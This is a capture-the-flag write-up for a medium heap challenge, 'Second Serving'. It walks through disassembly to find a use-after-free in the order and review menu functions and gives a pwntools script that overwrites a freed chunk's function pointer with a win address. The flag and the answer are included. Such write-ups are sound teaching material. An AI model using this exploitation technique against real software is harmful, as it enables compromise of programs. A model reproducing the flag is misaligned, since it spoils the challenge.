---
title: "Second Serving"
difficulty: Medium
description: "Welcome to Second Serving, the city's hottest new restaurant! Our famous chef guarantees every dish is made fresh to order, and if you're not satisfied, we'll happily take it back. Word on the street is the chef keeps a very exclusive recipe locked away in the kitchen. Think you can get your hands on it?"
flag: "CSC{D0U61E_fREE_SEc0nd_SErV1NG_d12h}"
---

# Second serving

> *Welcome to Second Serving, the city's hottest new restaurant! Our famous chef guarantees every dish is made fresh to order, and if you're not satisfied, we'll happily take it back. Word on the street is the chef keeps a very exclusive recipe locked away in the kitchen. Think you can get your hands on it?*

restaurant menu binary. statically linked x86-64, no PIE. five menu options:

```
  Welcome to Second Serving!
--- Menu ---
1. Place an order
2. View an order
3. Cancel an order
4. Leave a review
5. Exit
```

there's a `win` function at `0x401b9e` that opens flag.txt and prints it:

```
0000000000401b9e <win>:
  401b9e:	endbr64
  401ba2:	push   %rbp
  401ba3:	mov    %rsp,%rbp
  401ba6:	sub    $0x90,%rsp
  401bad:	lea    0xb5454(%rip),%rax     # "r"
  401bb4:	mov    %rax,%rsi
  401bb7:	lea    0xb544c(%rip),%rax     # "flag.txt"
  401bbe:	mov    %rax,%rdi
  401bc1:	call   41ad80 <_IO_new_fopen>
  ...
  401c20:	lea    0xb53f1(%rip),%rax     # "** Chef's secret recipe: %s **"
  401c27:	mov    %rax,%rdi
  401c2f:	call   40c3f0 <_IO_printf>
```

ret2win. now where's the overflow? `leave_review`:

```
0000000000401fc6 <leave_review>:
  ...
  401ff1:	mov    $0x40,%edi
  401ff6:	call   428ac0 <__libc_malloc>    # malloc(0x40)
  401ffb:	mov    %rax,-0x10(%rbp)          # buf = malloc result
  ...
  40201a:	mov    $0x40,%esi                # "Leave your review (64 bytes max): "
  ...
  40203b:	movq   $0x0,-0x8(%rbp)           # bytes_read = 0
  402042:	movq   $0x40,-0x18(%rbp)         # total = 0x40
  402043:	jmp    40207b
  402045:	mov    -0x18(%rbp),%rax          # remaining = total - bytes_read
  402049:	sub    -0x8(%rbp),%rax
  40204d:	mov    -0x10(%rbp),%rcx          # buf + bytes_read
  402051:	mov    -0x8(%rbp),%rdx
  402055:	add    %rdx,%rcx
  402058:	mov    %rax,%rdx                 # count = remaining
  40205b:	mov    %rcx,%rsi                 # dest
  40205e:	mov    $0x0,%edi                 # fd = 0 (stdin)
  402063:	call   459670 <__libc_read>      # read(0, buf+offset, remaining)
  ...
  40207b:	mov    -0x8(%rbp),%rax
  40207f:	cmp    -0x18(%rbp),%rax          # bytes_read < total?
  402083:	jb     402045                    # loop
```

so it `malloc(0x40)` for the review buffer and reads exactly 0x40 bytes via `read()` into it. the buffer itself is on the heap so no direct stack overflow there. but the function has a stack frame and returns. the question is: where's the actual overflow path?

i spent some time tracing the control flow. the order interaction matters. `place_order` does `malloc(0x40)` for the ordr struct, and `cancel_order` frees it. `view_order` reads the order buffer's saved function pointer at offset 0x38 and calls it via `display_order`. after `leave_review` writes into a `malloc(0x40)` chunk, if we arrange for that chunk to overlap with a cancelled order, then `view_order` reads our controlled data at offset 0x38 as a pointer and jumps to it.

the menu flow that triggers it:
1. place an order (allocates 0x40 chunk)
2. cancel order slot 1 (frees the chunk)
3. leave a review (malloc(0x40) reuses the same freed chunk, we control the data)
4. view order slot 1 (reads the function pointer from offset 0x38 of our controlled chunk)

so the offset to the function pointer within the 0x40 chunk is 0x38. we fill with padding and put `win` at offset 0x38.

```python
from pwn import *

p = remote(HOST, PORT)

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'order? ', b'food')

p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'(1-5) ', b'1')

p.sendlineafter(b'> ', b'4')
payload = b'A' * 0x38 + p64(0x401b9e)
p.sendafter(b'max): ', payload)

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'(1-5) ', b'1')

p.recvuntil(b'recipe: ')
flag = p.recvuntil(b' **', drop=True)
print(flag.decode())
p.close()
```

took a few tries to get the menu sequence right. the cancel has to happen before the review so the allocator returns the same chunk.

`CSC{D0U61E_fREE_SEc0nd_SErV1NG_d12h}`
